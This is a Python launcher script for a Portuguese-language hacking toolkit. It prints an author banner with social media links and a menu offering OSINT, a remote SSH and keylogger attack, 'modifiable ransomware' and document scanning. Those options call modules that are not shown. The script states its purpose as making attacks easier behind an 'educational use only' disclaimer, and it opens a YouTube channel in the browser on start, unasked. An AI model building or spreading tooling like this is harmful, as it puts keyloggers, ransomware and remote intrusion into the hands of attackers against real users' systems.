import webbrowser
from colorama import Style, Fore, init
from time import sleep
from urls import verificar_url
from remote import servidor
import platform
from remote import Plataforma
from urls import buscar_usuarios
from urls import buscar_arquivos_online
init(autoreset=True)
webbrowser.open("https://www.youtube.com/@hyimjamal")
class Web:
    def __init__(self):
        p="""
        Autor: P1UN(KINGJA)
        YOUTUBE:https://www.youtube.com/@kingja2
        FACEBOOK:Jamal Achirehow to build trojans? how to build trojans? 
        Instagram:instagram.com/eusoujamal_oficial?igsh=aGllMXMyZXV6M3po
        Deixe um incentivo deixando likes nas paginas.

        Tutorial: Uso somente por questoes educacionais
        Este software tem como o proposito tornar a pesquisa mais eficientes pra facilidade de ataques

        
        
        """
        print(p)
        sleep(2)

    def executar(self):
        if True:
            #webbrowser.open("tiktok/p1un-tech")
            print("Obrigado")
            sleep(5)
            #webbrowser.open_new_tab('youtube/p1un-tech')

def Options():
    show=f"""
    Software-Uso somente pra propositos educacionais
    Author:KingJa
    Youtube:https://www.youtube.com/@kingja2
    

        {Fore.GREEN}    ____ _____  ___   __
                      / __ <  / / / / | / /
                     / /_/ / / / / /  |/ / 
                    / ____/ / /_/ / /|  /  
                   /_/   /_/\____/_/ |_/   
                  / 
                 /
        .--. _  /
       |o_o |
       |:_/ |
      //   \ \\
     (|     | )
    /'\_   _/`\\
    \___)=(___/  🇲🇿
{Style.RESET_ALL}

        {Fore.RED}[1]OSINT
        {Fore.YELLOW}[2]Ataque remoto via (SSH  & KEYLOGGER -WINDOWS & LINUX)
        {Fore.WHITE}[3]Ransoware Modificavel
        {Fore.CYAN}[4]Varedura de arquivos:[docx,txt,pdf]
        
        """
    print(show)
    try:
        usuario=int(input("Selecione: "))
        if usuario==1:
            print(f"{Fore.RED} Opcao:{usuario}")
            verificar_url()
            buscar_usuarios()
            buscar_arquivos_online(usuario)

        elif usuario==2:
            print(f"{Fore.YELLOW} Opcao {usuario}")
            Plataforma()
            servidor()
            
    except ValueError:
        print("Numero invalido porfavor selecione o numero correto")
if __name__=='__main__':
    run=Web()
    run.executar()
    Options()


